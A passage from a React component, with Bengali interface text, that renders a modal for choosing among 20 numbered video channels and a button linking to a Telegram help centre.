                className="mt-3.5 text-xs text-gray-400 hover:text-gray-600 p-1 cursor-pointer"
              >
                বন্ধ করুন
              </button>
            </div>
          </div>
        )}

        {/* ================= ২০টি চ্যানেল সিলেক্টর মোডাল ================= */}
        {showChannelModal && (
          <div
            role="dialog"
            aria-modal="true"
            className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-xs p-4 animate-in fade-in"
          >
            <div className="w-full max-w-sm max-h-[85vh] bg-white rounded-3xl p-5 shadow-2xl border border-emerald-100 flex flex-col animate-in zoom-in-95 duration-200">
              <div className="flex items-center justify-between pb-3 border-b border-gray-100">
                <div>
                  <h3 className="text-base font-bold text-gray-900">চ্যানেল ও প্যাথ নির্বাচন</h3>
                  <p className="text-xs text-gray-500">মোট ২০টি সম্পূর্ণ স্বতন্ত্র ও নিরাপদ চ্যানেল</p>
                </div>
                <button
                  onClick={() => setShowChannelModal(false)}
                  className="w-8 h-8 rounded-full bg-gray-100 hover:bg-gray-200 flex items-center justify-center text-gray-600 font-bold"
                >
                  ✕
                </button>
              </div>

              <div className="flex-1 overflow-y-auto py-2 space-y-1.5 my-2">
                {CHANNELS_REGISTRY.map((ch) => {
                  const isCurrent = ch.slotNumber === activeChannel.slotNumber;
                  return (
                    <button
                      key={ch.slotNumber}
                      onClick={() => {
                        soundFx.playTap();
                        setActiveChannelSlot(ch.slotNumber);
                      }}
                      className={`w-full p-2.5 rounded-xl border text-left flex items-center justify-between transition-all ${
                        isCurrent
                          ? 'bg-emerald-50 border-emerald-500 shadow-sm'
                          : 'bg-white hover:bg-gray-50 border-gray-200'
                      }`}
                    >
                      <div>
                        <div className="flex items-center gap-1.5">
                          <span className={`text-xs font-bold ${isCurrent ? 'text-emerald-700' : 'text-gray-800'}`}>
                            #{ch.slotNumber} {ch.nameBn}
                          </span>
                          {isCurrent && (
                            <span className="text-[10px] bg-emerald-600 text-white px-1.5 py-0.2 rounded-full font-bold">
                              সক্রিয়
                            </span>
                          )}
                        </div>
                        <p className="text-[10px] text-gray-400 mt-0.5">
                          স্লট #{ch.slotNumber} • সম্পূর্ণ স্বতন্ত্র চ্যানেল
                        </p>
                      </div>
                      <span className="text-xs font-bold text-emerald-600">
                        {isCurrent ? '✓' : 'চাপুন'}
                      </span>
                    </button>
                  );
                })}
              </div>

              <div className="py-2.5 border-t border-gray-100">
                <a
                  href="https://t.me/httpsViralVideoBangla"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="w-full py-2.5 px-3 rounded-xl bg-[#229ED9] hover:bg-[#1e8cc0] text-white text-xs font-bold flex items-center justify-center gap-2 shadow-sm transition-all"
                >
                  <svg className="w-4 h-4 fill-current" viewBox="0 0 24 24">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 00-.05-.18c-.06-.05-.14-.03-.21-.02-.09.02-1.49.95-4.22 2.79-.4.27-.76.41-1.08.4-.36-.01-1.04-.2-1.55-.37-.63-.2-1.12-.31-1.08-.66.02-.18.27-.36.74-.55 2.92-1.27 4.86-2.11 5.83-2.51 2.78-1.16 3.35-1.36 3.73-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.06.01.24 0 .38z"/>
                  </svg>
                  <span>টেলিগ্রাম হেল্প সেন্টারে মেসেজ পাঠান</span>
                </a>
              </div>

              <div className="pt-2 border-t border-gray-100 flex items-center justify-between text-xs text-gray-500">
                <span>বর্তমান চ্যানেল: <span className="text-emerald-700 font-bold">স্লট #{activeChannel.slotNumber}</span></span>
                <button
                  onClick={() => setShowChannelModal(false)}
                  className="text-emerald-700 font-bold hover:underline"
                >
                  বন্ধ করুন
                </button>
              </div>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
